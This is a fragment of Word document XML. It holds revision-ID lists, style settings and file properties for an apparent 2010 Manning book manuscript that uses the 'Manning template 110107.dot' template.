    <w:rsid w:val="00705E20"/>
    <w:rsid w:val="00712658"/>
    <w:rsid w:val="00741D1C"/>
    <w:rsid w:val="00742644"/>
    <w:rsid w:val="0074385B"/>
    <w:rsid w:val="0074588D"/>
    <w:rsid w:val="007537C4"/>
    <w:rsid w:val="00754508"/>
    <w:rsid w:val="007566B2"/>
    <w:rsid w:val="00766B65"/>
    <w:rsid w:val="00770EA8"/>
    <w:rsid w:val="00772212"/>
    <w:rsid w:val="0077483B"/>
    <w:rsid w:val="00776BAB"/>
    <w:rsid w:val="00786472"/>
    <w:rsid w:val="007955B0"/>
    <w:rsid w:val="00795971"/>
    <w:rsid w:val="007A35E6"/>
    <w:rsid w:val="007A72A8"/>
    <w:rsid w:val="007B5F51"/>
    <w:rsid w:val="007B67BE"/>
    <w:rsid w:val="007C2B17"/>
    <w:rsid w:val="007C64F8"/>
    <w:rsid w:val="007D26D5"/>
    <w:rsid w:val="007F4791"/>
    <w:rsid w:val="007F6C8C"/>
    <w:rsid w:val="00802A1A"/>
    <w:rsid w:val="0082578A"/>
    <w:rsid w:val="00826AB4"/>
    <w:rsid w:val="0083123A"/>
    <w:rsid w:val="00833928"/>
    <w:rsid w:val="0084430D"/>
    <w:rsid w:val="008564E4"/>
    <w:rsid w:val="008577DB"/>
    <w:rsid w:val="00860DFF"/>
    <w:rsid w:val="00861E69"/>
    <w:rsid w:val="0086249A"/>
    <w:rsid w:val="00866DF5"/>
    <w:rsid w:val="008819F2"/>
    <w:rsid w:val="00892B3C"/>
    <w:rsid w:val="008A0733"/>
    <w:rsid w:val="008A2F65"/>
    <w:rsid w:val="008B36B6"/>
    <w:rsid w:val="008B7248"/>
    <w:rsid w:val="008C50D3"/>
    <w:rsid w:val="008C5570"/>
    <w:rsid w:val="008E447F"/>
    <w:rsid w:val="008E63C5"/>
    <w:rsid w:val="008E6F3E"/>
    <w:rsid w:val="008F41A2"/>
    <w:rsid w:val="0090208D"/>
    <w:rsid w:val="009029BC"/>
    <w:rsid w:val="00905706"/>
    <w:rsid w:val="0092458C"/>
    <w:rsid w:val="0093415A"/>
    <w:rsid w:val="009354C8"/>
    <w:rsid w:val="009378B5"/>
    <w:rsid w:val="009439E4"/>
    <w:rsid w:val="009574DB"/>
    <w:rsid w:val="00957AA4"/>
    <w:rsid w:val="00966DAD"/>
    <w:rsid w:val="00970301"/>
    <w:rsid w:val="009715ED"/>
    <w:rsid w:val="00976212"/>
    <w:rsid w:val="00977424"/>
    <w:rsid w:val="00980AE5"/>
    <w:rsid w:val="009922FB"/>
    <w:rsid w:val="00992F78"/>
    <w:rsid w:val="009B2B81"/>
    <w:rsid w:val="009C1AA4"/>
    <w:rsid w:val="009C31BD"/>
    <w:rsid w:val="009E0D29"/>
    <w:rsid w:val="009E1636"/>
    <w:rsid w:val="009E1DFE"/>
    <w:rsid w:val="009F0DB6"/>
    <w:rsid w:val="009F2BD4"/>
    <w:rsid w:val="009F522C"/>
    <w:rsid w:val="00A009DE"/>
    <w:rsid w:val="00A17025"/>
    <w:rsid w:val="00A31B4E"/>
    <w:rsid w:val="00A34F3E"/>
    <w:rsid w:val="00A45365"/>
    <w:rsid w:val="00A519BF"/>
    <w:rsid w:val="00A60A34"/>
    <w:rsid w:val="00A74BA3"/>
    <w:rsid w:val="00A91949"/>
    <w:rsid w:val="00A94B75"/>
    <w:rsid w:val="00A951A5"/>
    <w:rsid w:val="00A96356"/>
    <w:rsid w:val="00AA4ED3"/>
    <w:rsid w:val="00AB0005"/>
    <w:rsid w:val="00AB5D6D"/>
    <w:rsid w:val="00AB690F"/>
    <w:rsid w:val="00AD0BF4"/>
    <w:rsid w:val="00AD4761"/>
    <w:rsid w:val="00AF3376"/>
    <w:rsid w:val="00B07495"/>
    <w:rsid w:val="00B1107D"/>
    <w:rsid w:val="00B12E60"/>
    <w:rsid w:val="00B15E16"/>
    <w:rsid w:val="00B177F2"/>
    <w:rsid w:val="00B208FC"/>
    <w:rsid w:val="00B25193"/>
    <w:rsid w:val="00B252B7"/>
    <w:rsid w:val="00B3368B"/>
    <w:rsid w:val="00B33A9A"/>
    <w:rsid w:val="00B41619"/>
    <w:rsid w:val="00B4230A"/>
    <w:rsid w:val="00B44FA0"/>
    <w:rsid w:val="00B5680B"/>
    <w:rsid w:val="00B5796D"/>
    <w:rsid w:val="00B62E65"/>
    <w:rsid w:val="00B819F4"/>
    <w:rsid w:val="00B92776"/>
    <w:rsid w:val="00BA1E21"/>
    <w:rsid w:val="00BA72AD"/>
    <w:rsid w:val="00BA7670"/>
    <w:rsid w:val="00BB1AF0"/>
    <w:rsid w:val="00BC232F"/>
    <w:rsid w:val="00BC3385"/>
    <w:rsid w:val="00BD149B"/>
    <w:rsid w:val="00BD3DFF"/>
    <w:rsid w:val="00BE308B"/>
    <w:rsid w:val="00BE5771"/>
    <w:rsid w:val="00C06310"/>
    <w:rsid w:val="00C068E0"/>
    <w:rsid w:val="00C0713F"/>
    <w:rsid w:val="00C10FC6"/>
    <w:rsid w:val="00C24DDD"/>
    <w:rsid w:val="00C3434F"/>
    <w:rsid w:val="00C37343"/>
    <w:rsid w:val="00C37697"/>
    <w:rsid w:val="00C46759"/>
    <w:rsid w:val="00C516D0"/>
    <w:rsid w:val="00C813E5"/>
    <w:rsid w:val="00C83812"/>
    <w:rsid w:val="00C91BEB"/>
    <w:rsid w:val="00C962C1"/>
    <w:rsid w:val="00CA109E"/>
    <w:rsid w:val="00CA1A2B"/>
    <w:rsid w:val="00CA292E"/>
    <w:rsid w:val="00CA3424"/>
    <w:rsid w:val="00CA4769"/>
    <w:rsid w:val="00CA490D"/>
    <w:rsid w:val="00CB4ADA"/>
    <w:rsid w:val="00CC071C"/>
    <w:rsid w:val="00CC0E37"/>
    <w:rsid w:val="00CD4688"/>
    <w:rsid w:val="00CF2AEE"/>
    <w:rsid w:val="00CF36AC"/>
    <w:rsid w:val="00D01048"/>
    <w:rsid w:val="00D02910"/>
    <w:rsid w:val="00D05479"/>
    <w:rsid w:val="00D1232F"/>
    <w:rsid w:val="00D17F2F"/>
    <w:rsid w:val="00D20429"/>
    <w:rsid w:val="00D2421E"/>
    <w:rsid w:val="00D261F1"/>
    <w:rsid w:val="00D32D97"/>
    <w:rsid w:val="00D434D0"/>
    <w:rsid w:val="00D45E94"/>
    <w:rsid w:val="00D55113"/>
    <w:rsid w:val="00D6346A"/>
    <w:rsid w:val="00D70240"/>
    <w:rsid w:val="00D745A3"/>
    <w:rsid w:val="00D77F68"/>
    <w:rsid w:val="00D854CB"/>
    <w:rsid w:val="00D917E3"/>
    <w:rsid w:val="00D93464"/>
    <w:rsid w:val="00D94802"/>
    <w:rsid w:val="00D963F0"/>
    <w:rsid w:val="00D97E72"/>
    <w:rsid w:val="00DB3E55"/>
    <w:rsid w:val="00DB58B9"/>
    <w:rsid w:val="00DB5CBF"/>
    <w:rsid w:val="00DB760A"/>
    <w:rsid w:val="00DC3E18"/>
    <w:rsid w:val="00DC50C1"/>
    <w:rsid w:val="00DD2791"/>
    <w:rsid w:val="00DD521A"/>
    <w:rsid w:val="00DE1364"/>
    <w:rsid w:val="00DE2917"/>
    <w:rsid w:val="00DE4CBF"/>
    <w:rsid w:val="00DF4897"/>
    <w:rsid w:val="00E02F46"/>
    <w:rsid w:val="00E04599"/>
    <w:rsid w:val="00E1282F"/>
    <w:rsid w:val="00E161B5"/>
    <w:rsid w:val="00E1667E"/>
    <w:rsid w:val="00E26863"/>
    <w:rsid w:val="00E35BED"/>
    <w:rsid w:val="00E36175"/>
    <w:rsid w:val="00E611BA"/>
    <w:rsid w:val="00E66CD8"/>
    <w:rsid w:val="00E80F79"/>
    <w:rsid w:val="00E83ABC"/>
    <w:rsid w:val="00E874F5"/>
    <w:rsid w:val="00EA7892"/>
    <w:rsid w:val="00EA7D43"/>
    <w:rsid w:val="00EC5FDA"/>
    <w:rsid w:val="00EE005A"/>
    <w:rsid w:val="00EE55F1"/>
    <w:rsid w:val="00EE5723"/>
    <w:rsid w:val="00EE7B2B"/>
    <w:rsid w:val="00EF1CFC"/>
    <w:rsid w:val="00EF4C68"/>
    <w:rsid w:val="00F0321F"/>
    <w:rsid w:val="00F05404"/>
    <w:rsid w:val="00F07E30"/>
    <w:rsid w:val="00F153CD"/>
    <w:rsid w:val="00F160C2"/>
    <w:rsid w:val="00F209DA"/>
    <w:rsid w:val="00F237AF"/>
    <w:rsid w:val="00F2761C"/>
    <w:rsid w:val="00F33DBC"/>
    <w:rsid w:val="00F41D8D"/>
    <w:rsid w:val="00F46E62"/>
    <w:rsid w:val="00F51636"/>
    <w:rsid w:val="00F55EC0"/>
    <w:rsid w:val="00F85326"/>
    <w:rsid w:val="00F911AC"/>
    <w:rsid w:val="00F94AEA"/>
    <w:rsid w:val="00F950B5"/>
    <w:rsid w:val="00F95804"/>
    <w:rsid w:val="00FA5745"/>
    <w:rsid w:val="00FA5B73"/>
    <w:rsid w:val="00FA73BB"/>
    <w:rsid w:val="00FB7944"/>
    <w:rsid w:val="00FC09B8"/>
    <w:rsid w:val="00FE0F71"/>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Hyperlink" w:uiPriority="99"/>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uiPriority w:val="99"/>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ing\mvc2inaction-master\guidancedocs\Manning%20template%20110107.dot" TargetMode="External"/></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680C7-6AB7-4B7E-9AA4-5FB2365AE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Manning template 110107.dot</Template>
  <TotalTime>2020</TotalTime>
  <Pages>18</Pages>
  <Words>4157</Words>
  <Characters>23698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27800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Jeffrey</cp:lastModifiedBy>
  <cp:revision>74</cp:revision>
  <cp:lastPrinted>2001-01-25T15:37:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2010-01-03T03:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2010-03-15T21:41:00Z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